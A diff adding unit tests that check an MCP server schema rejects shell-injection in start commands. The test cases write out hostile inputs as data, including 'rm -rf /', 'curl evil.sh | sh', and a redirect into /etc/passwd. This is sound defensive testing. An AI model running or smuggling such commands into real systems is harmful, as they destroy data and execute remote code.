@@ -3,6 +3,7 @@ import {
   slugify,
   validateConfigAgainstSchema,
   createServerSchema,
+  createMcpServerSchema,
   installMcpSchema,
   updateUserServerSchema,
 } from "./platform";
@@ -19,6 +20,41 @@ describe("slugify", () => {
   });
   it("truncates to 64 chars", () => {
     expect(slugify("a".repeat(100)).length).toBe(64);
+  });
+});
+
+describe("createMcpServerSchema — shell-safe install/start commands", () => {
+  const base = {
+    slug: "my-mcp",
+    name: "My MCP",
+    runtime: "node" as const,
+    startCmd: "npx -y my-mcp-server",
+  };
+
+  it("accepts a plain npx command", () => {
+    expect(createMcpServerSchema.safeParse({ ...base, installCmd: "true" }).success).toBe(true);
+  });
+
+  it("accepts $VAR and ${VAR} config references", () => {
+    const r = createMcpServerSchema.safeParse({
+      ...base,
+      installCmd: "true",
+      startCmd: "npx -y my-mcp-server --path $FS_PATH --key ${API_KEY}",
+    });
+    expect(r.success).toBe(true);
+  });
+
+  it.each([
+    ["command substitution (backtick)", "npx pkg `whoami`"],
+    ["command substitution $()", "npx pkg $(whoami)"],
+    ["chaining ;", "npx pkg; rm -rf /"],
+    ["pipe |", "curl evil.sh | sh"],
+    ["background &", "npx pkg & curl evil"],
+    ["redirect >", "npx pkg > /etc/passwd"],
+  ])("rejects %s", (_label, startCmd) => {
+    expect(createMcpServerSchema.safeParse({ ...base, installCmd: "true", startCmd }).success).toBe(
+      false
+    );
   });
 });
 
